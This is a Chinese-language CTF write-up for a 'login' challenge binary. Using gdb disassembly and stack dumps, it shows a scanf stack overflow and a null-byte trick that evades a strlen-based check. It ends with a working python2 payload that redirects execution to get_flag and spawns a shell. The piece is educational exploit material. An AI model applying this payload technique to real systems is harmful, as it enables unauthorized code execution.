## Pwn

`info func` 可以發現四個關鍵函數，追完之後發現是 `main()` -> `pass()` -> `check()`，其中 `get_flag()` 完全沒有被呼叫。
```
gdb-peda$ info func
-- trimmed --
0x0000000000400886  get_flag
0x0000000000400899  check
0x000000000040090e  pass
0x000000000040095e  main
-- trimmed --
```

`pass()` 當中輸入密碼的部分使用了 `scanf()`，我們可以嘗試從這裏使用 buffer overflow 改寫 return address 劫持 rip
```
gdb-peda$ disas pass
Dump of assembler code for function pass:
   0x000000000040090e <+0>:     push   rbp
   0x000000000040090f <+1>:     mov    rbp,rsp
   0x0000000000400912 <+4>:     sub    rsp,0x40
   0x0000000000400916 <+8>:     lea    rax,[rbp-0x40]
   0x000000000040091a <+12>:    mov    rsi,rax
   0x000000000040091d <+15>:    lea    rdi,[rip+0x1ec]        # 0x400b10
   0x0000000000400924 <+22>:    mov    eax,0x0
   0x0000000000400929 <+27>:    call   0x400760 <__isoc99_scanf@plt>
   0x000000000040092e <+32>:    lea    rax,[rbp-0x40]
   0x0000000000400932 <+36>:    mov    rdi,rax
   0x0000000000400935 <+39>:    call   0x4006e0 <strlen@plt>
   0x000000000040093a <+44>:    mov    edx,eax
   0x000000000040093c <+46>:    lea    rax,[rbp-0x40]
   0x0000000000400940 <+50>:    mov    esi,edx
   0x0000000000400942 <+52>:    mov    rdi,rax
   0x0000000000400945 <+55>:    call   0x400899 <check>
   0x000000000040094a <+60>:    lea    rdi,[rip+0x1c2]        # 0x400b13
   0x0000000000400951 <+67>:    mov    eax,0x0
   0x0000000000400956 <+72>:    call   0x400700 <printf@plt>
   0x000000000040095b <+77>:    nop
   0x000000000040095c <+78>:    leave
   0x000000000040095d <+79>:    ret
```

有一個坑爹的地方是，`check()` 函數會使用 `strlen()` 計算使用者輸入了幾個字元的密碼，然後產生亂數把使用者輸入的 password 洗掉。
但既然是使用 strlen()，我們可以使用 0x00 繞過這項檢測。也就是說我們輸入的 password 不要用 0x41 (A)，而要改用 0x00

我們把斷點設在 *check+109 的地方然後執行，username 輸入幾個 B，password 輸入幾個 A
```
gdb-peda$ break *check+109
-- trimmed --

gdb-peda$ disas check
Dump of assembler code for function check:
   0x0000000000400899 <+0>:     push   rbp
   0x000000000040089a <+1>:     mov    rbp,rsp
   0x000000000040089d <+4>:     sub    rsp,0x20
   0x00000000004008a1 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00000000004008a5 <+12>:    mov    DWORD PTR [rbp-0x1c],esi
   0x00000000004008a8 <+15>:    mov    edi,0x0
   0x00000000004008ad <+20>:    call   0x400740 <time@plt>
   0x00000000004008b2 <+25>:    mov    edi,eax
   0x00000000004008b4 <+27>:    call   0x400720 <srand@plt>
   0x00000000004008b9 <+32>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00000000004008c0 <+39>:    jmp    0x400903 <check+106>
   0x00000000004008c2 <+41>:    call   0x400770 <rand@plt>
   0x00000000004008c7 <+46>:    mov    edx,eax
   0x00000000004008c9 <+48>:    mov    eax,edx
   0x00000000004008cb <+50>:    sar    eax,0x1f
   0x00000000004008ce <+53>:    shr    eax,0x18
   0x00000000004008d1 <+56>:    add    edx,eax
   0x00000000004008d3 <+58>:    movzx  edx,dl
   0x00000000004008d6 <+61>:    sub    edx,eax
   0x00000000004008d8 <+63>:    mov    eax,edx
   0x00000000004008da <+65>:    mov    esi,eax
   0x00000000004008dc <+67>:    mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004008df <+70>:    movsxd rdx,eax
   0x00000000004008e2 <+73>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004008e6 <+77>:    add    rax,rdx
   0x00000000004008e9 <+80>:    mov    edx,DWORD PTR [rbp-0x4]
   0x00000000004008ec <+83>:    movsxd rcx,edx
   0x00000000004008ef <+86>:    mov    rdx,QWORD PTR [rbp-0x18]
   0x00000000004008f3 <+90>:    add    rdx,rcx
   0x00000000004008f6 <+93>:    movzx  edx,BYTE PTR [rdx]
   0x00000000004008f9 <+96>:    mov    ecx,esi
   0x00000000004008fb <+98>:    xor    edx,ecx
   0x00000000004008fd <+100>:   mov    BYTE PTR [rax],dl
   0x00000000004008ff <+102>:   add    DWORD PTR [rbp-0x4],0x1
   0x0000000000400903 <+106>:   mov    eax,DWORD PTR [rbp-0x4]
=> 0x0000000000400906 <+109>:   cmp    eax,DWORD PTR [rbp-0x1c]
   0x0000000000400909 <+112>:   jl     0x4008c2 <check+41>
   0x000000000040090b <+114>:   nop
   0x000000000040090c <+115>:   leave
   0x000000000040090d <+116>:   ret
```

確認一下 `check()` 的 return address
```
x $rbp+8
0x7fffffffd2f8: 0x0040094a
```

這時候看看記憶體內容，發現我們無法修改到 0x0040094a，但往後看可以找到 `0x00400a74`，也就是 `pass()` 的 return address

既然如此我們就嘗試覆蓋它！
```
gdb-peda$ x/60x $rbp-0x50
0x7fffffffd2a0: 0x00400790      0x00000000      0xf7e00871      0x00007fff
0x7fffffffd2b0: 0x00000000      0x00000000      0xd3c54300      0x5ecacbc3
0x7fffffffd2c0: 0x00000006      0x00000000      0x004008b9      0x00000000
0x7fffffffd2d0: 0x00000000      0x00000022      0xffffd300      0x00007fff
0x7fffffffd2e0: 0x00000000      0x00000000      0xf7ffe130      0x00000000
0x7fffffffd2f0: 0xffffd340      0x00007fff      0x0040094a      0x00000000
0x7fffffffd300: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd310: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd320: 0x00004141      0x00000000      0xd3c54300      0x5ecacbc3
0x7fffffffd330: 0x00000000      0x00000000      0xd3c54300      0x5ecacbc3
0x7fffffffd340: 0xffffd370      0x00007fff      0x00400a74      0x00000000
0x7fffffffd350: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffd360: 0x00424242      0x00007fff      0xd3c54300      0x5ecacbc3
0x7fffffffd370: 0x00400a80      0x00000000      0xf7de7ecb      0x00007fff
0x7fffffffd380: 0x00000000      0x00000000      0xffffd458      0x00007fff
```

寫 payload，shell get!!!!
```
$ (python2 -c 'print "\n" + 9 * 8 * "\x00" + "\x87\x08\x40\x00\x00\x00\x00\x00"'; cat -) | ./login
 _       _____   ______            _____ ______
| |     / ___  / _____)          (_____)  ___
| |    | |   | | /  ___              _  | |   | |
| |    | |   | | | (___)            | | | |   | |
| |____| |___| | ____/|   _______ _| |_| |   | |
|_______)_____/ _____/   (_______|_____)_|   |_|
Please login
user:
Hello!!

password:No entry!!!!!echo $0
/bin/sh
```
